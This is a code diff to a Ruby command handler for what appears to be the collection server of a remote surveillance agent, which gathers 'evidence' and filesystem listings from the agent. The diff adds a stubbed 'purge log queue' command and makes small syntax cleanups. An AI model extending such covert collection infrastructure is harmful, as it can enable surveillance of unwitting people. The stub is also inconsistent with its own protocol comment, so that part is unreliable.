@@ -34,6 +34,7 @@ module Commands
   PROTO_EVIDENCE      = 0x09       # Upload of an evidence
   PROTO_EVIDENCE_SIZE = 0x0b       # Queue for evidence
   PROTO_FILESYSTEM    = 0x19       # List of paths to be scanned
+  PROTO_PURGE         = 0x1a       # purge the log queue
 
   LOOKUP = { PROTO_ID => :command_id,
              PROTO_CONF => :command_conf,
@@ -41,6 +42,7 @@ module Commands
              PROTO_DOWNLOAD => :command_download,
              PROTO_FILESYSTEM => :command_filesystem,
              PROTO_UPGRADE => :command_upgrade,
+             PROTO_PURGE => :command_purge,
              PROTO_EVIDENCE => :command_evidence,
              PROTO_EVIDENCE_SIZE => :command_evidence_size,
              PROTO_BYE => :command_bye}
@@ -81,11 +83,16 @@ module Commands
     # ask to the db if there are any availables for the agent
     # the results are actually downloaded and saved locally
     # we will retrieve the content when the agent ask for them later
-    if DB.instance.new_conf? session[:bid] then
+    if DB.instance.new_conf? session[:bid]
       available += [PROTO_CONF].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New config"
     end
-    if DB.instance.new_uploads? session[:bid] then
+    # TODO: retrieve values from DB
+    if true
+      available += [PROTO_PURGE].pack('I')
+      trace :info, "[#{peer}][#{session[:cookie]}] Available: Purge"
+    end
+    if DB.instance.new_uploads? session[:bid]
       available += [PROTO_UPLOAD].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New uploads"
     end
@@ -93,7 +100,7 @@ module Commands
       available += [PROTO_UPGRADE].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New upgrade"
     end
-    if DB.instance.new_downloads? session[:bid] then
+    if DB.instance.new_downloads? session[:bid]
       available += [PROTO_DOWNLOAD].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New downloads"
     end
@@ -156,7 +163,7 @@ module Commands
     conf = DB.instance.new_conf session[:bid]
 
     # send the response
-    if conf.nil? then
+    if conf.nil?
       trace :info, "[#{peer}][#{session[:cookie]}] NO new configuration"
       response = [PROTO_NO].pack('I')
     else
@@ -180,7 +187,7 @@ module Commands
     upload, left = DB.instance.new_uploads session[:bid]
 
     # send the response
-    if upload.nil? then
+    if upload.nil?
       trace :info, "[#{peer}][#{session[:cookie]}] NO uploads"
       response = [PROTO_NO].pack('I')
     else
@@ -209,7 +216,7 @@ module Commands
     upgrade, left = DB.instance.new_upgrade session[:bid]
 
     # send the response
-    if upgrade.nil? then
+    if upgrade.nil?
       trace :info, "[#{peer}][#{session[:cookie]}] NO upgrade"
       response = [PROTO_NO].pack('I')
     else
@@ -239,7 +246,7 @@ module Commands
     downloads = DB.instance.new_downloads session[:bid]
 
     # send the response
-    if downloads.empty? then
+    if downloads.empty?
       trace :info, "[#{peer}][#{session[:cookie]}] NO downloads"
       response = [PROTO_NO].pack('I')
     else
@@ -268,7 +275,7 @@ module Commands
     filesystems = DB.instance.new_filesystems session[:bid]
 
     # send the response
-    if filesystems.empty? then
+    if filesystems.empty?
       trace :info, "[#{peer}][#{session[:cookie]}] NO filesystem"
       response = [PROTO_NO].pack('I')
     else
@@ -333,6 +340,29 @@ module Commands
     trace :info, "[#{peer}][#{session[:cookie]}] Evidence queue size: #{num} (#{size.to_s_bytes})"
 
     return [PROTO_OK].pack('I') + [0].pack('I')
+  end
+
+  # Protocol Purge
+  # -> PROTO_PURGE
+  # <- PROTO_NO | PROTO_OK [ numElem,[ depth1, dir1, depth2, dir2, ... ]]
+  def command_purge(peer, session, message)
+    trace :info, "[#{peer}][#{session[:cookie]}] Purge request"
+
+    # TODO: retrieve values from DB
+    time = 0
+    size = 0
+
+    # send the response
+    if time == 0 && size == 0
+      trace :info, "[#{peer}][#{session[:cookie]}] NO purge"
+      response = [PROTO_NO].pack('I')
+    else
+      response = [PROTO_OK].pack('I')
+      response += [time.getutc.to_i].pack('Q') + [size].pack('I')
+      trace :info, "[#{peer}][#{session[:cookie]}] purge requests sent [#{time}][#{size}]"
+    end
+
+    return response
   end
 
 end #Commands
